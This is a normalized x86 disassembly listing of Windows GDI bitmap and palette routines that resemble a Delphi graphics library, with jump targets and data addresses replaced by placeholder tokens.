cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c964
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d610
call sub_41c964
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41c964
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41d610
call sub_41c964
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e158
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_4039d0
call sub_4039d0
jmp r-xdata
sub_421c01
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421c10
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_40394c
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421c70
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_421cd4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4211c8
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421ecf
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41e158
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421e87
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_42160c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_421ee0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41f2d8
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421438
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_421f48
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_422658
mov eax [ esi + 0x28 ]
call sub_42143c
mov eax [ esi + 0x2c ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_421f84
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42203c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b98
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422928
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_421438
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42143c
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414654
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_422074
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422658
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_422103
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_421c70
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_42160c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_422108
mov eax [ ebp - 0x8 ]
call sub_41c094
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_40394c
call sub_4039a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_422134
push ebx
mov ebx eax
mov eax ebx
call sub_422428
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d3ac
pop ebx
retn
sub_422164
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415d74
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_422658
lea eax [ ebx + 0x2c ]
call sub_40d3ac
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422928
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4221d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41de34
mov eax ebx
call sub_422768
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_422564
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_422414
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
call SetStretchBltMode
mov eax ebx
call sub_4224a8
mov dl [ r-xdata ]
call sub_41de34
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_422708
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4224a8
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42241b
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4223a9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41e158
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4224a8
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41e2fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_422428
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_422668
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_422074
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41e0b0
sub_4224a8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_422668
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421244
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_422134
sub_4224f0
push ebx
mov ebx eax
mov eax ebx
call sub_422658
mov eax ebx
call sub_422668
mov edx ebx
mov eax ebx
call sub_422134
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_422514
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_422594
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41c964
mov eax ebx
call sub_422564
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4224a8
xor edx edx
pop ecx
call sub_41dcec
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4225e4
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_422768
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_42160c
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_422668
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_415d10
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4226eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_422708
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_422658
mov eax ebx
call sub_422668
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_422594
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_421cd4
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4211c8
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_422768
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41e848
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4211c8
push 0x0
call GetDC
call sub_41e158
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_422820
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41e020
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_422074
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_422658
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b98
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_4228a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415cf0
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_422fb8
pop esi
pop ebx
retn
sub_4228c8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_416580
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42291c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422923
mov eax [ ebp - 0x4 ]
call sub_403198
retn
sub_422928
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4229af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403348
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_422a0f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42143c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_421438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a16
push rw-data
call LeaveCriticalSection
retn
sub_422a28
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_422fb8
pop edx
pop edi
pop esi
pop ebx
retn
sub_422a50
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026dc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_422f6d
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_422f40
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
